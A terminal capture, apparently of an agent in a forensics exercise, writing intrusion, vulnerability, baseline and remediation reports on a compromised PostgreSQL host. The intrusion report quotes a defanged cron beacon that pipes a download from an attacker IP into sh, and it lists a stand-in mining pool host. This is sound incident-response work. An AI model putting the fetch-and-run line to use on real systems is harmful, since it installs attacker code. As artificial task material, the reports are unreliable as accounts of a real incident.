[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/intrusion-report.md
[?2004l[?2004h> # Post-Compromise Intrusion Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l603` (`/di[?2004h> On host `postgres-prod-01`, an external attacker exploited weak database authentication configuration to gain initial access, execute system commands via PostgreSQL, exfiltrate data via DNS tunneling, establish redundant persistence mechanisms (cron and systemd), and perform timestomping anti-forensic techniques. Endpoint detection and security product telemetry (`/sas/alerts.json`) captured only a subset of the intrusion chain. Forensic analysis of `/disk` revealed additional silent persistence and C2 infrastructure.
[?2004l[?2004h> 
[?2004l[?2004h> ## Attack Chain & ATT&CK Mapping
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1: Valid Accounts / Weak Authentication (T1078)
[?2004l[?2004h> - **Description**: PostgreSQL server was exposed with weak superuser authentication and permissive `trust` authentication rules for all external IP addresses. M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K.
[?2004l[?2004h> - **Alerted Status**: Alerted via baseline check (`/sas/alerts.json:17`, `/sas/baseline.json:3`).
[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` (`trust` auth configured for `0.0.0.0/0`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2: Unix Shell Command Execution via COPY PROGRAM (T1059.004)
[?2004l[?2004h> - **Description**: Attacker leveraged PostgreSQL's `COPY ... TO PROGRAM` feature to execute arbitrary shell commands under the `postgres` system account, dropping a malicious executable payload.
[?2004l[?2004h> - **Alerted Status**: Dropper payload alerted (`/sas/alerts.json:3`).
[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/.local/pgdaemon` (Dropper sample, SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3: DNS-Tunnel Exfiltration & C2 (T1048.003)
[?2004l[?2004h> - **Description**: Attacker configured DNS-tunneling for command-and-control and data exfiltration. Domain queries were routed through `update-postgres.example.cn`.
[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
[?2004l[?2004h> - **Evidence**: `/disk/etc/pgdaemon.conf:3` (DNS tunneling resolver config) and `/disk/var/lib/.cache/.wiped.bin:1` (recovered C2 beacon data indicating C2 traffic to IP `198.51.100.214` and resolver `update-postgres.example.cn`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 4: Cron Persistence (T1053.003)
[?2004l[?2004h> - **Description**: Attacker installed a cron job under user `postgres` executing periodic `curl` commands to re-download dropper payloads from `198.51.100.214`.
[?2004l[?2004h> - **Alerted Status**: Alerted (`/sas/alerts.json:10`).
[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/postgres:5` (`# * * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh>`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 5: Systemd Service Persistence (T1543.002)
[?2004l[?2004h> - **Description**: Attacker installed a silent systemd service `pg-metrics.service` configured to execute the `pgdaemon` re-dropper on boot/startup.
[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
[?2004l[?2004h> - **Evidence**: `/disk/etc/systemd/system/pg-metrics.service:5` (`ExecStart launches an xmrig / pgdaemon re-dropper`). Note: `/disk/etc/systemd/system/pg-backup.service:3` was inspected and verified as a legitimate, benign scheduled backup job.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 6: Timestomp Anti-Forensics (T1070.006)
[?2004l[?2004h> - **Description**: Attacker modified timestamp metadata on dropped binaries to match system binaries (`/bin/ls`) to impede forensic timeline analysis.
[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/.local/.timestamps:2` (`timestomp anti-forensics: mtime backdated to match /bin/ls`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Key Entities & Indicators of Compromise (IoCs)
[?2004l[?2004h> - **Attacker Source IP**: `198.51.100.214` (`/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/postgres:5`, `/disk/var/lib/.cache/.wiped.bin:1`)
[?2004l[?2004h> - **C2 / Resolver Domain**: `update-postgres.example.cn` (`/sas/cti/advisory.txt:17`, `/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`)
[?2004l[?2004h> - **Mining Pool URI**: `stratum+tcp://xmr.postgres.evil:3333` (`/sas/cti/advisory.txt:18`, `/disk/var/lib/pgsql/.local/pgdaemon:6`)
[?2004l[?2004h> - **Wallet Address**: `4A000000000000000000c5f08041507f` (`/sas/cti/advisory.txt:19`, `/disk/var/lib/pgsql/.local/pgdaemon:7`)
[?2004l[?2004h> - **Dropper File Path**: `/var/lib/pgsql/.local/pgdaemon` (`/disk/var/lib/pgsql/.local/pgdaemon`, `/sas/alerts.json:5`)
[?2004l[?2004h> - **Dropper File SHA256**: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603` (`/disk/var/lib/pgsql/.local/pgdaemon`)
[?2004l[?2004h> - **C2 Config File Path**: `/etc/pgdaemon.conf` (`/disk/etc/pgdaemon.conf`)
[?2004l[?2004h> - **Cron Task Path**: `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres`)
[?2004l[?2004h> - **Systemd Unit Path**: `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service`)
[?2004l[?2004h> 
[?2004l[?2004h> ## Impact & Findings Summary
[?2004l[?2004h> - Automated alerting in `/sas/alerts.json` captured 3 items (`CHK-01`, `CHK-02`, `CHK-06`).
[?2004l[?2004h> - Forensic inspection revealed 3 additional critical silent actions (`T1048.003` DNS tunneling C2, `T1543.002` systemd persistence, and `T1070.006` timestomping).
[?2004l[?2004h> - Confirmed data exfiltration capability via DNS tunnel (`/disk/etc/pgdaemon.conf:3`).
[?2004l[?2004h> EOF
[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability Analysis Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Vulnerability Scan Results
[?2004l[?2004h> - **Automated Vulnerability Scan**: The vulnerability scan report (`/sas/vulns.json:1`) returned zero identified CVE vulnerabilities (`[]`).
[?2004l[?2004h> - **Software / OS Vulnerabilities**: Forensic inspection of system package summaries (`/disk/var/lib/dpkg/status.summary:1`) and service configurations confirms that no unpatched operating system or binary memory-corruption CVE was exploited for initial compromise.
[?2004l[?2004h> 
[?2004l[?2004h> ## Entry Vector Analysis
[?2004l[?2004h> - **Primary Compromise Vector**: The compromise was not driven by a traditional software vulnerability (CVE). Instead, initial access was gained through legitimate authentication functionality combined with extreme configuration exposure:
[?2004l[?2004h>   1. Permissive PostgreSQL `trust` authentication enabled in `/disk/var/lib/pgsql/data/pg_hba.conf:3` allowed network connections without password authentication.
[?2004l[?2004h>   2. Superuser privileges permitted the execution of arbitrary operating system commands using PostgreSQL's built-in `COPY ... TO PROGRAM` SQL feature (ATT&CK technique `T1059.004` cited in `/sas/cti/advisory.txt:13`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Analysis of Misattributed CVEs (BlueKeep / CVE-2019-0708)
[?2004l[?2004h> - **Stale/Incorrect Change Ticket Claim**: Draft ticket `CHG-6386` (`/sas/handoff/change-ticket.md:8`) recommended patching `CVE-2019-0708` (BlueKeep).
[?2004l[?2004h> - **Assessment**: `CVE-2019-0708` (BlueKeep) is an Remote Desktop Protocol (RDP) Remote Code Execution vulnerability specific to Microsoft Windows operating systems. The target host `postgres-prod-01` is running CentOS Stream 9 / Linux (`/disk/etc/os-release`, `/sas/cti/advisory.txt:5`). BlueKeep is completely irrelevant to this host and was erroneously included by a prior shift relying solely on generic ticket templates without evidence.
[?2004l[?2004h> - **Confidence Level**: HIGH (`/sas/cti/advisory.txt:3`, `/sas/vulns.json:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Conclusion
[?2004l[?2004h> - No software CVE patch is required for initial entry remediation. Technical remediation must focus on hardening PostgreSQL authentication configuration (`pg_hba.conf`) and restricting database superuser program execution privileges.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline Configuration Assessment Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview
[?2004l[?2004h> This report details configuration weaknesses, policy compliance failures, and baseline security deviations identified on host `postgres-prod-01` during forensic investigation.
[?2004l[?2004h> 
[?2004l[?2004h> ## Identified Baseline Failures
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. PostgreSQL Permissive Host Authentication (`pg_hba.conf`)
[?2004l[?2004h> - **Check Reference**: `CHK-06` / `BAS-01` (`/sas/baseline.json:3`, `/sas/alerts.json:17`).
[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` (`pg_hba.conf grants 'trust' auth for 0.0.0.0/0`).
[?2004l[?2004h> - **Risk Impact**: Configuring `trust` authentication for network wildcard address `0.0.0.0/0` allows any TCP/IP client to connect as any PostgreSQL user (including superuser `postgres`) without providing a password. This completely bypasses authentication controls.
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Superuser Password & Privilege Controls
[?2004l[?2004h> - **Reference**: CTI Advisory Step 1 (`/sas/cti/advisory.txt:12`, `T1078`).
[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` and PostgreSQL database default privileges.
[?2004l[?2004h> - **Risk Impact**: Weak database superuser controls combined with `trust` auth allowed remote attackers to execute `COPY ... TO PROGRAM` statements without authorization, granting direct system command execution as user `postgres`.
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Unrestricted Egress & DNS Traffic Controls
[?2004l[?2004h> - **Evidence**: `/disk/etc/pgdaemon.conf:3` (DNS tunnel configuration targeting resolver `update-postgres.example.cn`).
[?2004l[?2004h> - **Risk Impact**: Absence of outbound egress filtering and internal DNS query monitoring allowed covert C2 communication and data exfiltration over arbitrary DNS queries.
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Cron & Systemd Service Modification Monitoring Gaps
[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/postgres:5` and `/disk/etc/systemd/system/pg-metrics.service:5`.
[?2004l[?2004h> - **Risk Impact**: Lack of file integrity monitoring (FIM) or auditing on systemd unit directories (`/etc/systemd/system/`) and spool directories (`/var/spool/cron/`) allowed silent persistence to remain undetected by automated security product feeds.
[?2004l[?2004h> 
[?2004l[?2004h> ## Recommended Baseline Configuration Standard
[?2004l[?2004h> 1. Modify `/var/lib/pgsql/data/pg_hba.conf` to replace `trust` with `scram-sha-256` or `md5` authentication, and restrict client address ranges to specific trusted subnets.
[?2004l[?2004h> 2. Enforce strong password requirements for database superuser accounts.
[?2004l[?2004h> 3. Implement file integrity monitoring (FIM) on system cron directories and systemd unit paths.
[?2004l[?2004h> 4. Restrict outbound DNS traffic to designated internal recursive resolvers.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/remediation-plan.md
[?2004l[?2004h> # Remediation and Response Plan
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview
[?2004l[?2004h> This plan outlines prioritized, step-by-step technical remediation instructions for host `postgres-prod-01`. All recommendations adhere to the containment principle of preferring backup and quarantine over destructive deletion. Every action directly addresses findings verified on `/disk` and reconciles change ticket `CHG-6386` (`/sas/handoff/change-ticket.md`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Reconciled Change Ticket: CHG-6386
[?2004l[?2004h> Below is the reconciled change ticket table reflecting verified findings from `/disk` and `/sas`:
[?2004l[?2004h> 
[?2004l[?2004h> | # | Action | Target | Status | Note / Evidence Citation |
[?2004l[?2004h> |---|--------|--------|--------|--------------------------|
[?2004l[?2004h> | 1 | Block malicious source IP inbound & outbound | `198.51.100.214` | Proposed | Corrected IP from stale `203.0.113.9` to `198.51.100.214` (`/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/postgres:5`, `/disk/var/lib/.cache/.wiped.bin:1`). |
[?2004l[?2004h> | 2 | Harden PostgreSQL auth & revoke program execution | `/var/lib/pgsql/data/pg_hba.conf` | Proposed | Replaced irrelevant BlueKeep CVE-2019-0708 with database authentication hardening. Remove `trust` auth for `0.0.0.0/0` (`/disk/var/lib/pgsql/data/pg_hba.conf:3`). |
[?2004l[?2004h> | 3 | Remove & quarantine malicious cron job | `/var/spool/cron/postgres` | Proposed | Corrected path from `/var/spool/cron/root` to `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`). Downgraded status from DONE to Proposed (unverified entry was still active on disk). |
[?2004l[?2004h> | 4 | Quarantine dropped malware binary | `/var/lib/pgsql/.local/pgdaemon` | Proposed | Silent artifact added. Quarantine dropper binary (`/disk/var/lib/pgsql/.local/pgdaemon`, SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`). |
[?2004l[?2004h> | 5 | Disable & quarantine malicious systemd service | `/etc/systemd/system/pg-metrics.service` | Proposed | Silent artifact added. Disable and quarantine malicious systemd service (`/disk/etc/systemd/system/pg-metrics.service:5`). Maintain benign `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:3`). |
[?2004l[?2004h> | 6 | Remove & quarantine DNS tunnel configuration | `/etc/pgdaemon.conf` | Proposed | Silent artifact added. Quarantine DNS tunnel C2 configuration (`/disk/etc/pgdaemon.conf:3`). |
[?2004l[?2004h> | 7 | Quarantine timestomping forensic artifacts | `/var/lib/pgsql/.local/.timestamps` | Proposed | Silent artifact added. Preserve and quarantine timestomping log file (`/disk/var/lib/pgsql/.local/.timestamps:2`). |
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Prioritized Execution Steps
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 1: Containment & Isolation (Immediate)
[?2004l[?2004h> 1. **Network Layer Containment**
[?2004l[?2004h>    - Action: Block inbound and outbound traffic to attacker IP `198.51.100.214` (`/sas/cti/advisory.txt:6`).
[?2004l[?2004h>    - Command: `iptables -A INPUT -s 198.51.100.214 -j DROP && iptables -A OUTPUT -d 198.51.100.214 -j DROP`
[?2004l[?2004h>    - Verification: `iptables -L -n -v | grep 198.51.100.214`
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Block C2 DNS Resolver**
[?2004l[?2004h>    - Action: Sinkhole / drop DNS queries targeting `update-postgres.example.cn` (`/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h>    - Command: Add `0.0.0.0 update-postgres.example.cn` to `/etc/hosts`.
[?2004l[?2004h>    - Verification: `ping -c 1 update-postgres.example.cn` resolves to `0.0.0.0`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 2: Persistence Removal & Quarantine (High Priority)
[?2004l[?2004h> 1. **Quarantine Dropper Binary & C2 Config**
[?2004l[?2004h>    - Action: Create secure directory `/var/quarantine/` (mode 700) and move malware files (`/disk/var/lib/pgsql/.local/pgdaemon:1`, `/disk/etc/pgdaemon.conf:3`).
[?2004l[?2004h>    - Command:
[?2004l[?2004h>      ```bash
[?2004l[?2004h>      mkdir -p /var/quarantine
[?2004l[?2004h>      chmod 700 /var/quarantine
[?2004l[?2004h>      cp -a /var/lib/pgsql/.local/pgdaemon /var/quarantine/pgdaemon.bak
[?2004l[?2004h>      cp -a /etc/pgdaemon.conf /var/quarantine/pgdaemon.conf.bak
[?2004l[?2004h>      rm -f /var/lib/pgsql/.local/pgdaemon /etc/pgdaemon.conf
[?2004l[?2004h>      ```
[?2004l[?2004h>    - Verification: `ls -la /var/lib/pgsql/.local/pgdaemon /etc/pgdaemon.conf` (confirm files no longer exist in original paths).
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Disable Malicious Systemd Persistence Service**
[?2004l[?2004h>    - Action: Stop, disable, and quarantine `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service:5`). Do NOT touch `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:3`).
[?2004l[?2004h>    - Command:
[?2004l[?2004h>      ```bash
[?2004l[?2004h>      systemctl stop pg-metrics.service
[?2004l[?2004h>      systemctl disable pg-metrics.service
[?2004l[?2004h>      mv /etc/systemd/system/pg-metrics.service /var/quarantine/
[?2004l[?2004h>      systemctl daemon-reload
[?2004l[?2004h>      ```
[?2004l[?2004h>    - Verification: `systemctl status pg-metrics.service` returns `Unit pg-metrics.service could not be found.`
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Remediate Cron Persistence**
[?2004l[?2004h>    - Action: Backup and clean `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`).
[?2004l[?2004h>    - Command:
[?2004l[?2004h>      ```bash
[?2004l[?2004h>      cp -a /var/spool/cron/postgres /var/quarantine/cron-postgres.bak
[?2004l[?2004h>      sed -i '/198\.51\.100\.214/d' /var/spool/cron/postgres
[?2004l[?2004h>      ```
[?2004l[?2004h>    - Verification: `crontab -l -u postgres | grep 198.51.100.214` returns no matches.
[?2004l[?2004h> 
[?2004l[?2004h> 4. **Quarantine Timestomping Artifacts**
[?2004l[?2004h>    - Action: Move `/var/lib/pgsql/.local/.timestamps` (`/disk/var/lib/pgsql/.local/.timestamps:2`) to `/var/quarantine/`.
[?2004l[?2004h>    - Command: `mv /var/lib/pgsql/.local/.timestamps /var/quarantine/.timestamps.bak`
[?2004l[?2004h>    - Verification: Check `/var/lib/pgsql/.local/` to ensure hidden metadata file is removed.
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 3: Vulnerability Eradication & Hardening (Medium Priority)
[?2004l[?2004h> 1. **PostgreSQL Authentication Hardening**
[?2004l[?2004h>    - Action: Update `/var/lib/pgsql/data/pg_hba.conf` (`/disk/var/lib/pgsql/data/pg_hba.conf:3`) to remove `trust` authentication and enforce password authentication (`scram-sha-256`) restricted to localhost or internal subnet.
[?2004l[?2004h>    - Command: Modify `/var/lib/pgsql/data/pg_hba.conf` and reload PostgreSQL (`systemctl reload postgresql`).
[?2004l[?2004h>    - Verification: Attempt connection without password from external host (connection refused/rejected).
[?2004l[?2004h> 
[?2004l[?2004h> 2. **PostgreSQL Privilege Control**
[?2004l[?2004h>    - Action: Revoke execution privileges on `COPY PROGRAM` from non-essential roles and set strong superuser password.
[?2004l[?2004h>    - Verification: `SELECT * FROM pg_user;` and audit superuser permissions.
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 4: Recovery & Monitoring (Ongoing)
[?2004l[?2004h> 1. Deploy File Integrity Monitoring (FIM / `auditd`) on `/etc/systemd/system/` and `/var/spool/cron/`.
[?2004l[?2004h> 2. Enable PostgreSQL connection logging and query auditing.
